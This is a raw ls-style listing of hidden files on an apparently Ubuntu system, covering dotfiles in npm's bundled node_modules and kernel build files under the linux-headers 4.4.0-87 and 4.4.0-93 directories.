-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/pumpify/.npmignore
-rw-r--r-- 1 root root 65 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/stream-each/node_modules/stream-shift/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/stream-each/node_modules/stream-shift/.npmignore
-rw-r--r-- 1 root root 62 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/stream-each/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/stream-each/.npmignore
-rw-r--r-- 1 root root 6 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/parallel-transform/node_modules/cyclist/.npmignore
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/parallel-transform/.npmignore
-rw-r--r-- 1 root root 69 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/flush-write-stream/.travis.yml
-rw-r--r-- 1 root root 33 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/flush-write-stream/.npmignore
-rw-r--r-- 1 root root 12 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/.npmignore
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/validate-npm-package-name/node_modules/builtins/.travis.yml
-rw-r--r-- 1 root root 66 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/validate-npm-package-name/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/validate-npm-package-name/.npmignore
-rw-r--r-- 1 root root 421 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fs-vacuum/.eslintrc
-rw-r--r-- 1 root root 215 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fs-vacuum/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fs-vacuum/.npmignore
-rw-r--r-- 1 root root 59 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/read-pkg-up/node_modules/read-pkg/node_modules/load-json-file/node_modules/parse-json/node_modules/error-ex/node_modules/is-arrayish/.istanbul.yml
-rw-r--r-- 1 root root 988 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/read-pkg-up/node_modules/read-pkg/node_modules/load-json-file/node_modules/parse-json/node_modules/error-ex/node_modules/is-arrayish/.travis.yml
-rw-r--r-- 1 root root 52 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/read-pkg-up/node_modules/read-pkg/node_modules/load-json-file/node_modules/parse-json/node_modules/error-ex/node_modules/is-arrayish/.npmignore
-rw-r--r-- 1 root root 264 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/read-pkg-up/node_modules/read-pkg/node_modules/load-json-file/node_modules/parse-json/node_modules/error-ex/node_modules/is-arrayish/.editorconfig
-rw-r--r-- 1 root root 84 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/require-main-filename/.travis.yml
-rw-r--r-- 1 root root 35 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/require-main-filename/.npmignore
-rw-r--r-- 1 root root 36 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/require-directory/.travis.yml
-rw-r--r-- 1 root root 8 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/require-directory/.npmignore
-rw-r--r-- 1 root root 47 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/cmd-shim/.travis.yml
-rw-r--r-- 1 root root 98 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/cmd-shim/.npmignore
-rw-r--r-- 1 root root 111 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/dezalgo/.travis.yml
-rw-r--r-- 1 root root 111 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/readdir-scoped-modules/.travis.yml
-rw-r--r-- 1 root root 5 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/qs/.eslintignore
-rw-r--r-- 1 root root 4139 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/qs/.jscs.json
-rw-r--r-- 1 root root 5 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/aws4/.tern-port
-rw-r--r-- 1 root root 59 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/aws4/.travis.yml
-rw-r--r-- 1 root root 33 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/aws4/.npmignore
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/jsprim/node_modules/verror/.npmignore
-rw-r--r-- 1 root root 0 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/jsprim/node_modules/verror/.gitmodules
-rw-r--r-- 1 root root 205 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/jsprim/node_modules/extsprintf/.gitmodules
-rw-r--r-- 1 root root 97 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/ecc-jsbn/.npmignore
-rw-r--r-- 1 root root 113 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/getpass/.travis.yml
-rw-r--r-- 1 root root 64 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/getpass/.npmignore
-rw-r--r-- 1 root root 22 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/jsbn/.npmignore
-rw-r--r-- 1 root root 38 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/tweetnacl/.npmignore
-rw-r--r-- 1 root root 44 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/asn1/.travis.yml
-rw-r--r-- 1 root root 19 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/asn1/.npmignore
-rw-r--r-- 1 root root 189 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/.travis.yml
-rw-r--r-- 1 root root 72 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/.npmignore
-rw-r--r-- 1 root root 54 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/.npmignore
-rw-r--r-- 1 root root 178 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/http-signature/.dir-locals.el
-rw-r--r-- 1 root root 150 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/isstream/.travis.yml
-rw-r--r-- 1 root root 6 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/isstream/.npmignore
-rw-r--r-- 1 root root 62 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/scripts/.eslintrc.yml
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/node_modules/json-stable-stringify/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/node_modules/json-stable-stringify/.npmignore
-rw-r--r-- 1 root root 435 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/.tonic_example.js
-rw-r--r-- 1 root root 193 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/performance-now/.tm_properties
-rw-r--r-- 1 root root 47 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/performance-now/.travis.yml
-rw-r--r-- 1 root root 9 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/performance-now/.npmignore
-rwxr-xr-x 1 root root 58 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/node_modules/cryptiles/.travis.yml
-rw-r--r-- 1 root root 177 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/node_modules/cryptiles/.npmignore
-rwxr-xr-x 1 root root 59 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/node_modules/boom/.travis.yml
-rw-r--r-- 1 root root 178 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/node_modules/boom/.npmignore
-rw-r--r-- 1 root root 58 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/node_modules/hoek/.travis.yml
-rw-r--r-- 1 root root 191 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/node_modules/hoek/.npmignore
-rwxr-xr-x 1 root root 38 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/node_modules/sntp/.travis.yml
-rw-r--r-- 1 root root 178 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/node_modules/sntp/.npmignore
-rwxr-xr-x 1 root root 37 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/.travis.yml
-rw-r--r-- 1 root root 194 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/hawk/.npmignore
-rw-r--r-- 1 root root 5392 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/extend/.travis.yml
-rw-r--r-- 1 root root 4108 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/extend/.jscs.json
-rw-r--r-- 1 root root 4 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/extend/.npmignore
-rw-r--r-- 1 root root 5 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/combined-stream/node_modules/delayed-stream/.npmignore
-rw-r--r-- 1 root root 7 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/json-stringify-safe/.npmignore
-rw-r--r-- 1 root root 43 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/stringstream/.travis.yml
-rw-r--r-- 1 root root 96 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/request/node_modules/stringstream/.npmignore
-rw-r--r-- 1 root root 73 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/update-notifier/node_modules/boxen/node_modules/term-size/node_modules/execa/node_modules/cross-spawn-async/.travis.yml
-rw-r--r-- 1 root root 32 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/update-notifier/node_modules/boxen/node_modules/term-size/node_modules/execa/node_modules/cross-spawn-async/.npmignore
-rw-r--r-- 1 root root 220 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/update-notifier/node_modules/boxen/node_modules/term-size/node_modules/execa/node_modules/cross-spawn-async/.editorconfig
-rw-r--r-- 1 root root 116 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/update-notifier/node_modules/latest-version/node_modules/package-json/node_modules/registry-auth-token/node_modules/rc/node_modules/minimist/.travis.yml
-rw-r--r-- 1 root root 42 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/update-notifier/node_modules/latest-version/node_modules/package-json/node_modules/registry-auth-token/node_modules/rc/.npmignore
-rw-r--r-- 1 root root 73 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/update-notifier/node_modules/latest-version/node_modules/package-json/node_modules/registry-auth-token/.npmignore
-rw-r--r-- 1 root root 116 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/update-notifier/node_modules/latest-version/node_modules/package-json/node_modules/registry-url/node_modules/rc/node_modules/minimist/.travis.yml
-rw-r--r-- 1 root root 42 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/update-notifier/node_modules/latest-version/node_modules/package-json/node_modules/registry-url/node_modules/rc/.npmignore
-rw-r--r-- 1 root root 105 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/lazy-property/.npmignore
-rw-r--r-- 1 root root 587 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/umask/.npmignore
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mkdirp/node_modules/minimist/.travis.yml
-rw-r--r-- 1 root root 116 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mkdirp/.travis.yml
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/glob/node_modules/minimatch/node_modules/brace-expansion/node_modules/balanced-match/.npmignore
-rw-r--r-- 1 root root 43 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/glob/node_modules/minimatch/node_modules/brace-expansion/node_modules/concat-map/.travis.yml
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/npm-registry-client/node_modules/concat-stream/node_modules/typedarray/.travis.yml
-rw-r--r-- 1 root root 134 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/read/node_modules/mute-stream/.travis.yml
-rw-r--r-- 1 root root 1297 Aug 15  2017 /usr/lib/node_modules/npm/.travis.yml
-rw-r--r-- 1 root root 539 Aug 15  2017 /usr/lib/node_modules/npm/.npmignore
-rw-r--r-- 1 root root 2813 Aug 15  2017 /usr/lib/node_modules/npm/.mailmap
-rw-r--r-- 1 root root 3755 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/kconfig/.conf.o.cmd
-rw-r--r-- 1 root root 4917 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/kconfig/.zconf.tab.o.cmd
-rw-r--r-- 1 root root 110 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/kconfig/.conf.cmd
-rw-r--r-- 1 root root 153 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/genksyms/.genksyms.cmd
-rw-r--r-- 1 root root 2481 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/genksyms/.parse.tab.o.cmd
-rw-r--r-- 1 root root 2719 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/genksyms/.genksyms.o.cmd
-rw-r--r-- 1 root root 3347 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/genksyms/.lex.lex.o.cmd
-rw-r--r-- 1 root root 4622 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.modpost.o.cmd
-rw-r--r-- 1 root root 2289 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.empty.o.cmd
-rw-r--r-- 1 root root 546 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.devicetable-offsets.h.cmd
-rw-r--r-- 1 root root 4451 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.sumversion.o.cmd
-rw-r--r-- 1 root root 3485 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.file2alias.o.cmd
-rw-r--r-- 1 root root 2537 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.mk_elfconfig.cmd
-rw-r--r-- 1 root root 5191 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.devicetable-offsets.s.cmd
-rw-r--r-- 1 root root 129 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.modpost.cmd
-rw-r--r-- 1 root root 104 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/mod/.elfconfig.h.cmd
-rw-r--r-- 1 root root 2391 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 3568 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 2839 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/selinux/mdp/.mdp.cmd
-rw-r--r-- 1 root root 3239 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/selinux/genheaders/.genheaders.cmd
-rw-r--r-- 1 root root 5133 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/.sign-file.cmd
-rw-r--r-- 1 root root 4268 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/basic/.fixdep.cmd
-rw-r--r-- 1 root root 1193 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/basic/.bin2c.cmd
-rw-r--r-- 1 root root 3972 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/.insert-sys-cert.cmd
-rw-r--r-- 1 root root 3253 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 2380 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 3387 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/.recordmcount.cmd
-rw-r--r-- 1 root root 4495 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/scripts/.extract-cert.cmd
-rw-r--r-- 1 root root 22 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/.23312.d
-rw-r--r-- 1 root root 190243 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/.config
-rw-r--r-- 1 root root 3362 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/tools/.relocs_32.o.cmd
-rw-r--r-- 1 root root 3342 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/tools/.relocs_common.o.cmd
-rw-r--r-- 1 root root 146 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/tools/.relocs.cmd
-rw-r--r-- 1 root root 3362 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/tools/.relocs_64.o.cmd
-rw-r--r-- 1 root root 54037 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/kernel/.asm-offsets.s.cmd
-rw-r--r-- 1 root root 320 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
-rw-r--r-- 1 root root 340 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
-rw-r--r-- 1 root root 315 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
-rw-r--r-- 1 root root 402 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
-rw-r--r-- 1 root root 292 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
-rw-r--r-- 1 root root 316 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
-rw-r--r-- 1 root root 320 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
-rw-r--r-- 1 root root 292 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
-rw-r--r-- 1 root root 333 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/purgatory/.purgatory.ro.cmd
-rw-r--r-- 1 root root 3529 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/purgatory/.string.o.cmd
-rw-r--r-- 1 root root 155 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd
-rw-r--r-- 1 root root 9092 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/purgatory/.sha256.o.cmd
-rw-r--r-- 1 root root 1304 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/purgatory/.stack.o.cmd
-rw-r--r-- 1 root root 1324 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/purgatory/.entry64.o.cmd
-rw-r--r-- 1 root root 3615 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/purgatory/.purgatory.o.cmd
-rw-r--r-- 1 root root 1374 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
-rw-r--r-- 1 root root 14210 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/kernel/.bounds.s.cmd
-rw-r--r-- 1 root root 190367 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/.config.old
-rw-r--r-- 1 root root 820 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 54 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/dtc/.gitignore
-rw-r--r-- 1 root root 167 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/kconfig/.gitignore
-rw-r--r-- 1 root root 31 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/kconfig/lxdialog/.gitignore
-rw-r--r-- 1 root root 42 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/genksyms/.gitignore
-rw-r--r-- 1 root root 154 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/.gitignore
-rw-r--r-- 1 root root 55 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/mod/.gitignore
-rw-r--r-- 1 root root 21 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/selinux/mdp/.gitignore
-rw-r--r-- 1 root root 11 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/selinux/genheaders/.gitignore
-rw-r--r-- 1 root root 13 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/basic/.gitignore
-rw-r--r-- 1 root root 12 Jan 10  2016 /usr/src/linux-headers-4.4.0-93/scripts/gdb/linux/.gitignore
-rw-r--r-- 1 root root 3755 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/kconfig/.conf.o.cmd
-rw-r--r-- 1 root root 4917 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/kconfig/.zconf.tab.o.cmd
-rw-r--r-- 1 root root 110 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/kconfig/.conf.cmd
-rw-r--r-- 1 root root 153 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/genksyms/.genksyms.cmd
-rw-r--r-- 1 root root 2481 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/genksyms/.parse.tab.o.cmd
-rw-r--r-- 1 root root 2719 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/genksyms/.genksyms.o.cmd
-rw-r--r-- 1 root root 3347 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/genksyms/.lex.lex.o.cmd
-rw-r--r-- 1 root root 4622 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.modpost.o.cmd
-rw-r--r-- 1 root root 2289 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.empty.o.cmd
-rw-r--r-- 1 root root 546 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.devicetable-offsets.h.cmd
-rw-r--r-- 1 root root 4451 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.sumversion.o.cmd
-rw-r--r-- 1 root root 3485 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.file2alias.o.cmd
-rw-r--r-- 1 root root 2537 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.mk_elfconfig.cmd
-rw-r--r-- 1 root root 5191 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.devicetable-offsets.s.cmd
-rw-r--r-- 1 root root 129 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.modpost.cmd
-rw-r--r-- 1 root root 104 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.elfconfig.h.cmd
-rw-r--r-- 1 root root 2391 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 3568 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 2839 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/selinux/mdp/.mdp.cmd
-rw-r--r-- 1 root root 3239 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/selinux/genheaders/.genheaders.cmd
-rw-r--r-- 1 root root 5133 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.sign-file.cmd
-rw-r--r-- 1 root root 4268 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/basic/.fixdep.cmd
-rw-r--r-- 1 root root 1193 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/basic/.bin2c.cmd
-rw-r--r-- 1 root root 3972 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.insert-sys-cert.cmd
-rw-r--r-- 1 root root 3253 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 2380 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 3387 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.recordmcount.cmd
-rw-r--r-- 1 root root 4495 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.extract-cert.cmd
-rw-r--r-- 1 root root 190243 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.config
-rw-r--r-- 1 root root 3362 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/tools/.relocs_32.o.cmd
-rw-r--r-- 1 root root 3342 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/tools/.relocs_common.o.cmd
-rw-r--r-- 1 root root 146 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/tools/.relocs.cmd
-rw-r--r-- 1 root root 3362 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/tools/.relocs_64.o.cmd
-rw-r--r-- 1 root root 54037 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/kernel/.asm-offsets.s.cmd
-rw-r--r-- 1 root root 320 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
-rw-r--r-- 1 root root 340 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
-rw-r--r-- 1 root root 315 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
-rw-r--r-- 1 root root 402 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
-rw-r--r-- 1 root root 292 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
-rw-r--r-- 1 root root 316 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
-rw-r--r-- 1 root root 320 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
-rw-r--r-- 1 root root 292 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
-rw-r--r-- 1 root root 333 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.purgatory.ro.cmd
-rw-r--r-- 1 root root 3529 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.string.o.cmd
-rw-r--r-- 1 root root 155 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd
-rw-r--r-- 1 root root 9092 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.sha256.o.cmd
-rw-r--r-- 1 root root 1304 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.stack.o.cmd
-rw-r--r-- 1 root root 1324 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.entry64.o.cmd
-rw-r--r-- 1 root root 3615 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.purgatory.o.cmd
-rw-r--r-- 1 root root 1374 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
-rw-r--r-- 1 root root 22 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.21135.d
-rw-r--r-- 1 root root 14210 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/kernel/.bounds.s.cmd
